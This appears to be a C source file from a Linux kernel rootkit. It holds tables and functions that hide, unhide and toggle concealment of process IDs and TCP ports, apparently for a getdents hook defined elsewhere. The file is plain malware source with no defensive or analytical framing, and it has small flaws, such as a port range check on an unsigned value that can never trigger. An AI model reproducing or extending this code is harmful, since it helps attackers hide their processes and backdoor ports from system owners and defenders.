#include "getdents.h"
#include "utils.h"

pid_t hide_pid[NAME_MAX] = {0};
unsigned short hide_port[MAX_TCP_PORTS] = {0};

void pid_hide(pid_t pid) {
  size_t i;
  for (i = 0; i < NAME_MAX; i++) {
    if (hide_pid[i] == 0) {
      hide_pid[i] = pid;
      PR_INFO("hiding process with pid %d\n", pid);
      return;
    }
  }
}

void pid_show(pid_t pid) {
  size_t i;
  for (i = 0; i < NAME_MAX; i++) {
    if (hide_pid[i] == pid) {
      hide_pid[i] = 0;
      PR_INFO("unhiding process with pid %d\n", pid);
      return;
    }
  }
}

int pid_is_hidden(pid_t pid) {
  size_t i;
  for (i = 0; i < NAME_MAX; i++) {
    if (hide_pid[i] == pid) {
      return 1;  // true
    }
  }
  return 0;  // false
}

void inline switch_pid_hide(pid_t pid) {
  if (pid_is_hidden(pid))
    pid_show(pid);
  else
    pid_hide(pid);
}

void port_hide(unsigned short port) {
  size_t i;
  for (i = 0; i < MAX_TCP_PORTS; i++) {
    if (hide_port[i] == 0) {
      hide_port[i] = port;
      PR_INFO("Port %d hidden\n", port);
      return;
    }
  }
}

void port_show(unsigned short port) {
  size_t i;
  for (i = 0; i < MAX_TCP_PORTS; i++) {
    if (hide_port[i] == port) {
      hide_port[i] = 0;
      PR_INFO("Port %d unhidden\n", port);
      return;
    }
  }
}

int port_is_hidden(unsigned short port) {
  size_t i;
  for (i = 0; i < MAX_TCP_PORTS; i++) {
    if (hide_port[i] == port) {
      return 1;  // true
    }
  }
  return 0;  // false
}

void inline switch_port_hide(unsigned short port) {
  if (port < 0 || port > 65535)  // invalid port
    return;

  if (port_is_hidden(port))
    port_show(port);
  else
    port_hide(port);
}